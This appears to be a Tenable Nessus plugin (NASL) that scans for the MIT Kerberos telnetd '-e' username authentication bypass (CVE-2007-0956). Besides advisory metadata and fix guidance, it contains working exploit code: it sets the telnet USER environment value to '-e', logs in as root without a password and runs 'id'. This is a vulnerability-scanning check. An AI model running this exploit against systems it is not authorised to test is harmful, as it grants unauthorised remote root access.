#
# (C) Tenable Network Security, Inc.
#

# Need Nessus 2.2.9 or newer
if (NASL_LEVEL < 2204 ) exit(0);

include("compat.inc");

if (description) {
  script_id(24998);
  script_version("$Revision: 1.24 $");
  script_cvs_date("$Date: 2016/05/11 13:32:18 $");

  script_cve_id("CVE-2007-0956");
  script_bugtraq_id(23281);
  script_osvdb_id(34106);
  script_xref(name:"CERT", value:"220816");

  script_name(english:"Kerberos telnet Crafted Username Remote Authentication Bypass");
  script_summary(english:"Attempts to log in as -e.");

  script_set_attribute(attribute:"synopsis", value:
"It is possible to log into the remote host using telnet without
supplying any credentials.");
  script_set_attribute(attribute:"description", value:
"An authentication bypass vulnerability exists in the MIT krb5 telnet
daemon due to a failure to sanitize malformed usernames. This allows
usernames beginning with '-e' to be interpreted as a command-line flag
by the login.krb5 program. A remote attacker can exploit this, via a
crafted username, to cause login.krb5 to execute part of the BSD
rlogin protocol, which in turn allows the attacker to login with an
arbitrary username without a password or any further authentication.");
  # http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2007-001-telnetd.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0ed21002");
  script_set_attribute(attribute:"solution", value:
"Apply the fixes described in MIT krb5 Security Advisory 2007-001, or
contact your vendor for a patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value: "2007/04/03");
  script_set_attribute(attribute:"plugin_publication_date", value: "2007/04/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mit:kerberos");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();
 
  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencie("find_service1.nasl");
  script_require_ports("Services/telnet", 23);
  script_exclude_keys("global_settings/supplied_logins_only");
  exit(0);
}

include ("global_settings.inc");
include ("audit.inc");
include ("byte_func.inc");
include ("telnet2_func.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port = get_kb_item("Services/telnet");
if (!port) port = 23;

global_var rcvdata, idsent, idstate;

function telnet_callback ()
{
 local_var data;
 data = _FCT_ANON_ARGS[0];

 if (data && ord(data[0]) != 0x00 && ord(data[0]) != 0x0d)
   rcvdata += data[0];


 if ( (idstate == 0 && (egrep(pattern:"login:", string:rcvdata, icase:TRUE))) || 
      egrep(pattern:"(password|usage):", string:rcvdata, icase:TRUE) )
 {
  exit(0);
 }

 if (idstate == 0)
 {
  telnet_write('plop\r\0');
  telnet_write('\0\r\0');
  rcvdata = NULL;
  idstate = 1;
 } 

 if (idstate == 1 && "login: login:" >< rcvdata)
 {
  rcvdata = NULL;
  telnet_write('root\r\0');
  telnet_write('id\r\0');
  idstate = 2;
 }

 if (idstate == 2 && "uid=" >< rcvdata)
 {
  security_hole(port:port, extra:'It was possible to log in and execute "id" : \n\n' + egrep(pattern:"uid=", string:rcvdata));
  telnet_write('exit\r\0');
  exit(0);
 }
}


rcvdata = NULL;
idstate = 0;

env_data = 
	mkbyte(0) +
	mkbyte(0) + "USER" +
	mkbyte(1) + "-e";

options = NULL;
options[0] = make_list(OPT_NEW_ENV, env_data);

if (!telnet2_init(options:options, timeout:10))
  exit(0);

telnet_loop();




